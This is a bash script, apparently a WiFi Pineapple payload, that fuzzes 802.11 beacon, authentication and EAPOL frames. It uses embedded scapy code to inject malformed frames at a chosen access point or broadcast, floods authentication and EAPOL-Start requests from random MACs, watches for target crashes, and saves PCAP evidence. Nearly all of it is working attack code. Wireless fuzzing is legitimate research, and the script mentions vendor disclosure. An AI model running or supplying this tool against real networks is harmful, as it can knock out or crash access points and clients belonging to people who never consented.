#!/bin/bash
###############################################################################
# ProtocolFuzzer — Wireless Protocol Frame Fuzzer & Crash Tester
# NullSec Suite | WiFi Pineapple Mark VII / Nano / Tetra
#
# Systematic fuzzing of 802.11 management, control, and data frames:
# - Beacon frame field fuzzing (SSID, rates, RSN, vendor IEs)
# - Authentication/Association frame malformation
# - EAPOL frame fuzzing for WPA/WPA2 state machine testing
# - Probe response injection with corrupted IEs
# - AP/Client crash detection & stability monitoring
# - Fuzzing campaign management with reproducible seeds
# - Crash evidence collection with PCAP capture
#
# Author : bad-antics (NullSec)
# Version: 1.0.0
# License: MIT
###############################################################################

LOOT_DIR="/mmc/nullsec/protocolfuzzer"
LOG_FILE="$LOOT_DIR/fuzzer.log"
CRASH_DIR="$LOOT_DIR/crashes"
REPORT_FILE="$LOOT_DIR/fuzzer_report.html"
CAMPAIGN_FILE="$LOOT_DIR/campaign.json"
IFACE=""
MON=""

RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[1;33m'
CYN='\033[0;36m'; MAG='\033[0;35m'; BLD='\033[1m'; RST='\033[0m'

log()   { echo -e "[$(date '+%H:%M:%S')] $*" | tee -a "$LOG_FILE"; }
ok()    { log "${GRN}[✓]${RST} $*"; }
warn()  { log "${YEL}[!]${RST} $*"; }
fail()  { log "${RED}[✗]${RST} $*"; }
info()  { log "${CYN}[i]${RST} $*"; }
crash() { log "${RED}[💥 CRASH]${RST} $*"; }

banner() {
    echo -e "${MAG}"
    cat << 'EOF'
  ____            _                  _ _____
 |  _ \ _ __ ___ | |_ ___   ___ ___ | |  ___|   _ _________ _ __
 | |_) | '__/ _ \| __/ _ \ / __/ _ \| | |_ | | | |_  /_  / '_  \
 |  __/| | | (_) | || (_) | (_| (_) | |  _|| |_| |/ / / /| |_) |
 |_|   |_|  \___/ \__\___/ \___\___/|_|_|   \__,_/___/___|  __/
                                                           |_|
  NullSec 802.11 Protocol Fuzzer
EOF
    echo -e "${RST}"
}

setup() {
    mkdir -p "$LOOT_DIR" "$CRASH_DIR"
    > "$LOG_FILE"
    echo '{"campaign_id":"","started":"","iterations":0,"crashes":0,"targets":[],"fuzz_types":[]}' > "$CAMPAIGN_FILE"

    IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1)
    [ -z "$IFACE" ] && { fail "No wireless interface"; exit 1; }

    airmon-ng check kill &>/dev/null
    airmon-ng start "$IFACE" &>/dev/null
    MON="${IFACE}mon"
    [ ! -d "/sys/class/net/$MON" ] && MON="$IFACE"

    # Check for required tools
    for tool in scapy python3 tcpdump; do
        command -v "$tool" &>/dev/null || warn "Missing: $tool"
    done

    ok "Monitor: $MON"
}

# ═══════════════════════════════════════════════════════════════════════════
# RANDOM DATA GENERATORS
# ═══════════════════════════════════════════════════════════════════════════
rand_bytes()  { head -c "$1" /dev/urandom | xxd -p | tr -d '\n'; }
rand_mac()    { printf '%02x:%02x:%02x:%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)); }
rand_ssid()   { head -c $((RANDOM % 32 + 1)) /dev/urandom | base64 | head -c $((RANDOM % 32 + 1)); }
rand_channel(){ echo $((RANDOM % 14 + 1)); }

# ═══════════════════════════════════════════════════════════════════════════
# BEACON FRAME FUZZER
# ═══════════════════════════════════════════════════════════════════════════
fuzz_beacons() {
    local target_bssid="$1" iterations="${2:-100}"
    info "=== Beacon Frame Fuzzing ($iterations iterations) ==="

    local crash_count=0
    local pcap="$LOOT_DIR/beacon_fuzz.pcap"

    # Background PCAP capture for evidence
    tcpdump -i "$MON" -w "$pcap" 2>/dev/null &
    local cap_pid=$!

    for i in $(seq 1 "$iterations"); do
        local fuzz_type=$((RANDOM % 8))
        local seed=$RANDOM

        python3 << PYEOF 2>/dev/null
from scapy.all import *
import random, struct

random.seed($seed)
iface = "$MON"

# Base beacon
dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2="$(rand_mac)", addr3="$(rand_mac)")
beacon = Dot11Beacon(cap="ESS+privacy")

fuzz_type = $fuzz_type

if fuzz_type == 0:
    # Oversized SSID (max 32, we send 0-255)
    ssid_len = random.randint(33, 255)
    ssid = bytes([random.randint(0, 255) for _ in range(ssid_len)])
    frame = RadioTap()/dot11/beacon/Dot11Elt(ID=0, info=ssid)

elif fuzz_type == 1:
    # Malformed supported rates
    rates = bytes([random.randint(0, 255) for _ in range(random.randint(1, 50))])
    frame = RadioTap()/dot11/beacon/Dot11Elt(ID=0, info=b"FuzzNet")/Dot11Elt(ID=1, info=rates)

elif fuzz_type == 2:
    # Corrupted RSN (WPA2) Information Element
    rsn_data = bytes([random.randint(0, 255) for _ in range(random.randint(2, 128))])
    frame = RadioTap()/dot11/beacon/Dot11Elt(ID=0, info=b"FuzzNet")/Dot11Elt(ID=48, info=rsn_data)

elif fuzz_type == 3:
    # Invalid channel in DS Parameter Set
    ds_channel = random.randint(0, 255)
    frame = RadioTap()/dot11/beacon/Dot11Elt(ID=0, info=b"FuzzNet")/Dot11Elt(ID=3, info=struct.pack('B', ds_channel))

elif fuzz_type == 4:
    # Oversized vendor-specific IE
    vendor_data = bytes([random.randint(0, 255) for _ in range(random.randint(100, 253))])
    frame = RadioTap()/dot11/beacon/Dot11Elt(ID=0, info=b"FuzzNet")/Dot11Elt(ID=221, info=vendor_data)

elif fuzz_type == 5:
    # Multiple conflicting IEs
    frame = RadioTap()/dot11/beacon
    for _ in range(random.randint(5, 30)):
        ie_id = random.randint(0, 255)
        ie_data = bytes([random.randint(0, 255) for _ in range(random.randint(0, 64))])
        frame = frame/Dot11Elt(ID=ie_id, info=ie_data)

elif fuzz_type == 6:
    # Zero-length beacon with random capabilities
    beacon2 = Dot11Beacon(cap=random.randint(0, 65535))
    frame = RadioTap()/dot11/beacon2

else:
    # Timestamp overflow
    beacon3 = Dot11Beacon(timestamp=random.randint(0, 2**64-1), cap=random.randint(0, 65535))
    frame = RadioTap()/dot11/beacon3/Dot11Elt(ID=0, info=b"FuzzNet")

try:
    sendp(frame, iface=iface, count=1, verbose=0)
except:
    pass
PYEOF

        # Check if target is still responding (every 10 iterations)
        if [ $((i % 10)) -eq 0 ] && [ -n "$target_bssid" ]; then
            local probe_resp
            probe_resp=$(timeout 3 tshark -i "$MON" -c 1 \
                -Y "wlan.bssid == $target_bssid && wlan.fc.type_subtype == 0x05" 2>/dev/null | wc -l)
            if [ "$probe_resp" -eq 0 ]; then
                crash "Target $target_bssid may have crashed at iteration $i (fuzz_type=$fuzz_type seed=$seed)"
                cp "$pcap" "$CRASH_DIR/crash_beacon_${i}_${seed}.pcap" 2>/dev/null
                ((crash_count++))
            fi
        fi

        printf "\r  Beacon fuzz: %d/%d | Crashes: %d  " "$i" "$iterations" "$crash_count"
    done
    echo ""

    kill $cap_pid 2>/dev/null; wait $cap_pid 2>/dev/null
    ok "Beacon fuzzing complete: $iterations iterations, $crash_count potential crashes"
}

# ═══════════════════════════════════════════════════════════════════════════
# AUTHENTICATION FRAME FUZZER
# ═══════════════════════════════════════════════════════════════════════════
fuzz_auth() {
    local target_bssid="$1" iterations="${2:-50}"
    info "=== Authentication Frame Fuzzing ($iterations iterations) ==="

    local crash_count=0

    for i in $(seq 1 "$iterations"); do
        local seed=$RANDOM

        python3 << PYEOF 2>/dev/null
from scapy.all import *
import random, struct

random.seed($seed)
iface = "$MON"
target = "$target_bssid" if "$target_bssid" else "ff:ff:ff:ff:ff:ff"
src = "$(rand_mac)"

fuzz_type = random.randint(0, 5)

dot11 = Dot11(type=0, subtype=11, addr1=target, addr2=src, addr3=target)

if fuzz_type == 0:
    # Invalid auth algorithm
    auth = Dot11Auth(algo=random.randint(2, 65535), seqnum=1, status=0)
    frame = RadioTap()/dot11/auth

elif fuzz_type == 1:
    # Huge sequence number
    auth = Dot11Auth(algo=0, seqnum=random.randint(3, 65535), status=0)
    frame = RadioTap()/dot11/auth

elif fuzz_type == 2:
    # Invalid status code
    auth = Dot11Auth(algo=0, seqnum=1, status=random.randint(1, 65535))
    frame = RadioTap()/dot11/auth

elif fuzz_type == 3:
    # SAE authentication with corrupted commit
    auth = Dot11Auth(algo=3, seqnum=1, status=0)
    sae_data = bytes([random.randint(0, 255) for _ in range(random.randint(32, 256))])
    frame = RadioTap()/dot11/auth/Raw(load=sae_data)

elif fuzz_type == 4:
    # Shared key auth with malformed challenge
    auth = Dot11Auth(algo=1, seqnum=2, status=0)
    challenge = bytes([random.randint(0, 255) for _ in range(random.randint(1, 512))])
    frame = RadioTap()/dot11/auth/Dot11Elt(ID=16, info=challenge)

else:
    # Rapid auth flood (different MACs)
    for _ in range(random.randint(5, 20)):
        src2 = RandMAC()
        dot11_2 = Dot11(type=0, subtype=11, addr1=target, addr2=str(src2), addr3=target)
        auth2 = Dot11Auth(algo=0, seqnum=1, status=0)
        sendp(RadioTap()/dot11_2/auth2, iface=iface, count=1, verbose=0)

try:
    sendp(frame, iface=iface, count=1, verbose=0)
except:
    pass
PYEOF

        printf "\r  Auth fuzz: %d/%d | Crashes: %d  " "$i" "$iterations" "$crash_count"
    done
    echo ""

    ok "Auth fuzzing complete: $iterations iterations"
}

# ═══════════════════════════════════════════════════════════════════════════
# EAPOL FRAME FUZZER
# ═══════════════════════════════════════════════════════════════════════════
fuzz_eapol() {
    local target_bssid="$1" iterations="${2:-50}"
    info "=== EAPOL Frame Fuzzing ($iterations iterations) ==="

    for i in $(seq 1 "$iterations"); do
        python3 << PYEOF 2>/dev/null
from scapy.all import *
import random, struct

iface = "$MON"
target = "$target_bssid" if "$target_bssid" else "ff:ff:ff:ff:ff:ff"
src = "$(rand_mac)"

fuzz_type = random.randint(0, 4)

dot11 = Dot11(type=2, subtype=0, addr1=target, addr2=src, addr3=target, FCfield="to-DS")
llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/SNAP(OUI=0, code=0x888e)

if fuzz_type == 0:
    # Corrupted EAPOL-Key with random key data
    eapol_data = struct.pack('>BBH', 2, 3, random.randint(0, 1024))
    eapol_data += bytes([random.randint(0, 255) for _ in range(random.randint(16, 256))])
    frame = RadioTap()/dot11/llc/Raw(load=eapol_data)

elif fuzz_type == 1:
    # Oversized EAPOL frame
    eapol_data = struct.pack('>BBH', 2, 3, 65535)
    eapol_data += bytes([random.randint(0, 255) for _ in range(512)])
    frame = RadioTap()/dot11/llc/Raw(load=eapol_data)

elif fuzz_type == 2:
    # Invalid EAPOL version
    eapol_data = struct.pack('>BBH', random.randint(3, 255), random.randint(0, 255), 0)
    frame = RadioTap()/dot11/llc/Raw(load=eapol_data)

elif fuzz_type == 3:
    # EAPOL-Start flood
    for _ in range(10):
        eapol_start = struct.pack('>BBH', 1, 1, 0)
        f = RadioTap()/Dot11(type=2, subtype=0, addr1=target, addr2=str(RandMAC()), addr3=target, FCfield="to-DS")/llc/Raw(load=eapol_start)
        sendp(f, iface=iface, count=1, verbose=0)

else:
    # Replay counter manipulation
    eapol_data = struct.pack('>BBH', 2, 3, 95)
    key_info = struct.pack('>H', random.randint(0, 65535))
    key_len = struct.pack('>H', random.randint(0, 64))
    replay = struct.pack('>Q', random.randint(0, 2**64-1))
    nonce = bytes([random.randint(0, 255) for _ in range(32)])
    eapol_data += key_info + key_len + replay + nonce
    eapol_data += bytes(16 + 16 + 2)  # IV + RSC + ID + MIC + key_data_len
    frame = RadioTap()/dot11/llc/Raw(load=eapol_data)

try:
    sendp(frame, iface=iface, count=1, verbose=0)
except:
    pass
PYEOF

        printf "\r  EAPOL fuzz: %d/%d  " "$i" "$iterations"
    done
    echo ""

    ok "EAPOL fuzzing complete: $iterations iterations"
}

# ═══════════════════════════════════════════════════════════════════════════
# REPORT
# ═══════════════════════════════════════════════════════════════════════════
generate_report() {
    info "Generating fuzzer report..."

    local crash_files; crash_files=$(ls "$CRASH_DIR"/*.pcap 2>/dev/null | wc -l)

    cat > "$REPORT_FILE" << HTMLEOF
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>ProtocolFuzzer Report</title>
<style>
:root{--bg:#0a0e17;--card:#111827;--accent:#a855f7;--red:#ef4444;--txt:#e0e0e0}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--txt);font-family:'Segoe UI',system-ui,sans-serif;padding:24px}
h1{color:var(--accent);font-size:28px;margin-bottom:16px}
h2{color:var(--accent);font-size:20px;margin:24px 0 12px}
.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:32px}
.card{background:var(--card);border-radius:12px;padding:20px;text-align:center;border:1px solid #222}
.card .v{font-size:42px;font-weight:800;color:var(--accent)}
.card .k{font-size:12px;color:#888;margin-top:4px}
.info-box{background:var(--card);border-radius:12px;padding:20px;border:1px solid #222;margin-bottom:24px;line-height:1.8}
.fuzz-types{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:24px}
.ftype{background:var(--card);border-radius:12px;padding:16px;border:1px solid #222}
.ftype h4{color:var(--accent);margin-bottom:8px;font-size:14px}
.ftype ul{padding-left:16px;font-size:12px;color:#aaa;line-height:1.8}
.footer{margin-top:32px;text-align:center;color:#555;font-size:12px}
</style></head><body>

<h1>🔧 ProtocolFuzzer — Campaign Report</h1>
<p style="color:#888;margin-bottom:24px">Generated: $(date -u '+%Y-%m-%d %H:%M UTC')</p>

<div class="grid">
<div class="card"><div class="v">3</div><div class="k">Fuzz Modules</div></div>
<div class="card"><div class="v" style="color:var(--red)">$crash_files</div><div class="k">Crash PCAPs</div></div>
<div class="card"><div class="v">$(wc -l < "$LOG_FILE" 2>/dev/null || echo 0)</div><div class="k">Log Entries</div></div>
</div>

<h2>🎯 Fuzzing Modules</h2>
<div class="fuzz-types">
<div class="ftype"><h4>Beacon Fuzzer</h4><ul>
<li>Oversized SSID (>32 bytes)</li>
<li>Malformed supported rates</li>
<li>Corrupted RSN/WPA2 IE</li>
<li>Invalid DS channel parameter</li>
<li>Oversized vendor IEs</li>
<li>Conflicting IE chains</li>
<li>Zero-length with random caps</li>
<li>Timestamp overflow</li>
</ul></div>
<div class="ftype"><h4>Auth Fuzzer</h4><ul>
<li>Invalid auth algorithm IDs</li>
<li>Huge sequence numbers</li>
<li>Invalid status codes</li>
<li>Corrupted SAE commit</li>
<li>Malformed shared key challenge</li>
<li>Rapid auth floods</li>
</ul></div>
<div class="ftype"><h4>EAPOL Fuzzer</h4><ul>
<li>Corrupted EAPOL-Key data</li>
<li>Oversized EAPOL frames</li>
<li>Invalid EAPOL versions</li>
<li>EAPOL-Start floods</li>
<li>Replay counter manipulation</li>
</ul></div>
</div>

<h2>⚠️ Security Implications</h2>
<div class="info-box">
<strong>Beacon Fuzzing:</strong> Tests AP and client parser robustness. Crashes indicate buffer overflow or unhandled edge cases in wireless drivers.<br>
<strong>Auth Fuzzing:</strong> Validates authentication state machine resilience. Weaknesses can lead to DoS or auth bypass.<br>
<strong>EAPOL Fuzzing:</strong> Targets the WPA 4-way handshake implementation. Vulnerabilities here can compromise key exchange security (see KRACK, dragonblood).<br><br>
<strong>Recommendation:</strong> Any crashes found should be reported to the vendor with the associated PCAP evidence from the crashes/ directory.
</div>

<div class="footer">ProtocolFuzzer v1.0.0 — NullSec Suite — For authorized security research only</div>
</body></html>
HTMLEOF

    ok "Report: $REPORT_FILE"
}

cleanup() {
    airmon-ng stop "$MON" &>/dev/null 2>&1
    ok "Monitor mode disabled"
}

show_menu() {
    while true; do
        echo ""
        echo -e "${MAG}╔═══════════════════════════════════════════════╗${RST}"
        echo -e "${MAG}║    ProtocolFuzzer — 802.11 Frame Fuzzer       ║${RST}"
        echo -e "${MAG}╠═══════════════════════════════════════════════╣${RST}"
        echo -e "${MAG}║${RST} [1] Beacon Frame Fuzzing                     ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [2] Authentication Frame Fuzzing              ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [3] EAPOL Frame Fuzzing                      ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [4] Full Campaign (all modules)              ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [5] Generate Report                         ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [6] View Crash Evidence                     ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [0] Exit                                    ${MAG}║${RST}"
        echo -e "${MAG}╚═══════════════════════════════════════════════╝${RST}"
        echo ""
        read -rp "Target BSSID (or Enter for broadcast): " target
        read -rp "Select> " c
        case "$c" in
            1) fuzz_beacons "$target" 100 ;;
            2) fuzz_auth "$target" 50 ;;
            3) fuzz_eapol "$target" 50 ;;
            4) fuzz_beacons "$target" 100; fuzz_auth "$target" 50; fuzz_eapol "$target" 50 ;;
            5) generate_report ;;
            6) ls -la "$CRASH_DIR"/*.pcap 2>/dev/null || info "No crashes captured" ;;
            0) cleanup; exit 0 ;;
            *) warn "Invalid" ;;
        esac
    done
}

main() {
    banner
    setup
    case "$1" in
        --beacon) fuzz_beacons "$2" "${3:-100}" ;;
        --auth)   fuzz_auth "$2" "${3:-50}" ;;
        --eapol)  fuzz_eapol "$2" "${3:-50}" ;;
        --all)    fuzz_beacons "$2" 100; fuzz_auth "$2" 50; fuzz_eapol "$2" 50; generate_report ;;
        *)        show_menu ;;
    esac
}

main "$@"
